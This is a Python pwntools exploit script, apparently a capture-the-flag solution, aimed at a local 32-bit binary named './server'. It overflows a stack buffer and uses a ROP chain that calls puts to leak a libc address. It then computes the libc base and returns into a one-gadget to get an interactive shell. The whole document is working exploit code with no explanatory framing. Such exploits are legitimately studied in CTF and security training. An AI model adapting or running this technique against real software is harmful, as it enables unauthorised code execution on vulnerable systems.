'''
Author: Samrito
Date: 2022-01-28 21:56:12
LastEditors: Samrito
LastEditTime: 2022-01-28 22:18:16
'''
from ctypes.wintypes import PUSHORT
from pwn import *


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


io = process(argv=['./server'])
elf = ELF('./server')
libc = ELF('./libc6_2.27-3ubuntu1_i386.so')

context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

vuln_addr = elf.symbols['vuln']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

#debug('b * 0x08048637')

io.recvuntil(b'Input some text')
payload = flat([b'@' * (0x38 + 4), puts_plt, vuln_addr, puts_got])
io.sendline(payload)
io.recvuntil(b'Return address')
io.recvline()
io.recvline()
res = io.recvline()
puts_addr = u32(res[:4])

gadget_libc_addr = 0x3d0d5
base_addr = puts_addr - libc.symbols['puts']
gadget_addr = gadget_libc_addr + base_addr

payload = flat([b'@' * (0x38 + 4), gadget_addr, 0xdeadbeef])
io.sendline(payload)

io.interactive()
